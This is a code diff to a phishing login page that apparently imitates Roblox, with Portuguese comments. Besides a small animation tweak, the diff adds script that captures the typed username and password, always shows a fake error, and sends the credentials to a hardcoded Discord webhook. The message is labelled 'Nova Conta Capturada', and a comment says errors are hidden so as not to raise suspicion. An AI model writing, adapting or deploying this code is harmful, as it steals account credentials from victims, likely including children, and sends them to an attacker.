@@ -115,13 +115,13 @@
     .error-message.show {
       opacity: 1;
       transform: translateY(0);
-      animation: shake 0.5s ease;
+      animation: shake 0.6s ease;
     }
 
     @keyframes shake {
       0%, 100% { transform: translateX(0); }
-      10%, 30%, 50%, 70%, 90% { transform: translateX(-8px); }
-      20%, 40%, 60%, 80% { transform: translateX(8px); }
+      10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+      20%, 40%, 60%, 80% { transform: translateX(10px); }
     }
 
     .links {
@@ -190,17 +190,46 @@
   <script>
     const form = document.getElementById('loginForm');
     const errorMsg = document.getElementById('errorMsg');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
 
-    form.addEventListener('submit', function(e) {
-      e.preventDefault(); // não recarrega a página
+    // COLE AQUI A URL DO SEU WEBHOOK DO DISCORD
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1473860451589685344/N8gc13rR1kJj7Pb5DznSI88Lpz_8BLcxUReQ5VulpR001D2os62t3HjFP-NTK_ABAuFm';  // ← Substitua isso pela URL real (ex: https://discord.com/api/webhooks/123456/abcdef...)
 
-      // Mostra a mensagem (e mantém ela visível)
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault(); // Não recarrega a página
+
+      const login = usernameInput.value.trim();
+      const senha = passwordInput.value.trim();
+
+      // Mostra erro na tela (e mantém para sempre)
       errorMsg.classList.add('show');
-      
-      // Força a animação mesmo se já estiver visível
       errorMsg.style.animation = 'none';
-      errorMsg.offsetHeight; // trigger reflow
+      errorMsg.offsetHeight; // força reflow para animação repetir
       errorMsg.style.animation = null;
+
+      // Envia pro Discord se tiver algo digitado e webhook configurado
+      if (login && senha && WEBHOOK_URL !== 'SEU_WEBHOOK_AQUI') {
+        try {
+          const mensagem = `🔐 **Nova Conta Capturada**\n\n**Login:**\n\( {login}\n\n**Senha:**\n \){senha}`;
+
+          const payload = {
+            content: mensagem,
+            username: "Roblox Captura",  // opcional: nome do webhook
+            avatar_url: "https://www.roblox.com/favicon.ico"  // opcional: ícone
+          };
+
+          await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+          // Se quiser ver no console do navegador: console.log('Enviado para Discord!');
+        } catch (err) {
+          console.error('Falha ao enviar:', err);
+          // Não mostra nada pro usuário pra não levantar suspeita
+        }
+      }
     });
   </script>
 
